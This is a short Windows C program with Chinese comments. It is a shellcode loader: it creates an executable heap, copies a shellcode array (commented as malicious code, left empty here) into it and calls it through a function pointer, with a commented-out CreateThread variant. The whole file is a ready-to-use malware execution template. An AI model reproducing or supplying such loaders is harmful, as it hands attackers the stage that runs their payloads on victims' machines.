#include <Windows.h>

// 定义 shellcode（恶意代码）
unsigned char shellcode[] = "";



// 主函数
void main() {
    // 创建一个具有执行权限的堆，以存储shellcode
    HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(shellcode), 0);

    // 在创建的堆中分配一块内存，并将其地址赋给buffer
    char* buffer = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(shellcode));

    // 将shellcode复制到buffer指向的内存中
    memcpy(buffer, shellcode, sizeof(shellcode));

    // 下面是另一种创建线程的方法，这里被注释掉了
    // 创建一个新线程并执行buffer指向的内存中的shellcode
    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

    // 等待新线程执行完毕
    // WaitForSingleObject(hThread, INFINITE);

    // 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode
    ((void(*)(void)) buffer)();
}
